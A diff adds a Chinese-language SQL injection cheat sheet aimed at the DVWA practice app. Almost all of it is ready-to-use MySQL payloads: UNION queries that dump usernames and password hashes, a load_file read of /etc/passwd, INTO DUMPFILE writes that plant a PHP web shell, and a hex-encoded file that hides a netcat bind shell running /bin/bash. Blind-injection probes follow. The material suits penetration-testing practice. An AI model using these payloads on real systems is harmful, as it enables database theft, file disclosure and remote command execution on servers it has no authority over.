@@ -1,0 +1,49 @@
+#kali提供相关字典
+/usr/share/golismero/tools/sqlmap/txt/
+把内容中以'#'开头的行去掉
+cat /usr/share/golismero/tools/sqlmap/txt/common-tables.txt | grep -v ^#
+#MYSQL:
+1' union select 1,2-- 
+1' union select user(),2-- 
+1' union select CONCAT_WS(CHAR(32,58,32),user(),database(),version()),2-- 
+其中CHAR(32,58,32)代表“空格冒号空格“
+常用函数:
+user()
+version()
+database()
+@@datadir
+@@VERSION
+@@hostname
+@@version_compile_os
+@@hostname
+CHAR(56)
+md5('a')
+
+Mysql数据库源数据表：information_schema
+
+1' union select table_name,table_schema from information_schema.tables-- 
+1' union select count(*),table_schema from information_schema.tables group by table_schema-- （schema中对应表的数量）
+1' union select table_name,table_schema from information_schema.tables where table_schema='dvwa'-- 
+1' union select table_name,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'-- 
+1' union select user,password from dvwa.users-- 
+1' union select null,concat(user,0x3a,password) from dvwa.users-- 
+
+#调用函数操作文件：load_file('/etc/passwd')
+读文件
+1' union select null,load_file('/etc/passwd')-- 
+写文件
+1' union select null,"<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE "/tmp/a.php"-- 
+#将文件内容以16进制形式显示：cat a.php | xxd -ps | tr -d '\n'
+将字符串转换为16进制：echo "ABCDaaa<>dlfk" | xxd -ps | tr -d '\n'
+注入16进制编码之后的内容（0x之后是编码之后的内容）：
+1' union select null,(0x3c3f7068702073797374656d28276e63202d6c702031323334202d65202f62696e2f6261736827293b3f3e0a) INTO DUMPFILE "/tmp/a.php"-- 
+#将数据保存在目标服务器文件上
+1' union select null,concat(user,0x3a,password) from dvwa.users INTO OUTFILE '/tmp/a.db'-- 
+
+SQL盲猜
+1' and user is null-- （猜同表的列名）
+1' and users.user is null-- （猜列名）
+1' and dvwa.users.user is null-- （猜列名）
+1' and (select count(*) from users)>0-- （猜表名）
+1' or users.password is null-- （猜列名）
+' or user='admin（猜字段内容）
